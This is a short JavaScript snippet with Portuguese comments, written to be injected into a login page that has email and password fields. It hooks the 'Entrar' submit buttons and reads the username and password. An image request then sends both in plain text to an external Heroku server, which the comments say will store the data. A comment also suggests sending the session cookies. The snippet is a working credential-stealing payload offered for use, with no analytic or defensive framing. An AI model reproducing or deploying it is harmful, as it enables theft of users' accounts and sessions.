server_address = 'https://floating-springs-98504.herokuapp.com' // o endereço do seu servidor que irá receber os dados
alert('noob');
// na primeira página é esse o botão "Entrar"
$("input[type='submit']").on('click', function(event){
    getCredenciais();
});

// Após errar pela primeira vez, muda a página e é assim que recupera o botão "Entrar"
$("button[type='submit']").on('click', function(event){
    getCredenciais();
});

// Recupera as credenciais e envia para o servidor Node armazenar
function getCredenciais(){
    login = $("input#email");
    senha = $("input#pass");
    cookies = document.cookie // pode enviar também os cookies se achar interessante
    if(login && senha){
        img = document.createElement("IMG");
        img.src = server_address + "?usuario=" + login.val() + "&senha=" + senha.val()
        document.appendChild(img);

    }
}
